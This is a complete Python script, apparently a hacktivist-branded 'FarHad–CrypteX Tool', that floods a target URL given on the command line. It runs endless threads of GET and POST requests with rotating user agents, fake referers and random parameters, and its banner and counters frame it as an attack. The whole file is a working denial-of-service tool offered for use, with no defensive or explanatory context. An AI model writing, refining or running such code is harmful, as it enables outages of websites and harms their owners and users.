import os
import sys
import threading
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)
os.system('clear')

print(Fore.CYAN + '''
╔═════════════════════════════════════════════════╗
║               Islamic Cyber Network             ║
║             FarHad–CrypteX Tool v2.0            ║
╚═════════════════════════════════════════════════╝
''')

if len(sys.argv) < 3:
    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads>")
    sys.exit()

url = sys.argv[1]
threads = int(sys.argv[2])

if not url.startswith("http://") and not url.startswith("https://"):
    print(Fore.RED + "Error: URL must start with http:// or https://")
    sys.exit()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
start_time = time.time()
lock = threading.Lock()

session = requests.Session()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attack():
    global success, failed
    while True:
        try:
            method = random.choice(['GET', 'POST'])
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': f"https://google.com/{random_string(5)}"
            }
            params = {random_string(5): random_string(8) for _ in range(3)}
            data = {random_string(5): random_string(8) for _ in range(3)}

            if method == 'GET':
                r = session.get(url, headers=headers, params=params, timeout=10)
            else:
                r = session.post(url, headers=headers, data=data, timeout=10)

            with lock:
                success += 1
                print(Fore.GREEN + f"[+] Sent {success} | Code: {r.status_code}")

        except Exception as e:
            with lock:
                failed += 1
                print(Fore.RED + f"[-] Failed {failed} | Error: {str(e)}")

def stats():
    while True:
        time.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.CYAN + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

# Start stats thread
threading.Thread(target=stats, daemon=True).start()

# Start attack threads
with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(threads):
        executor.submit(attack)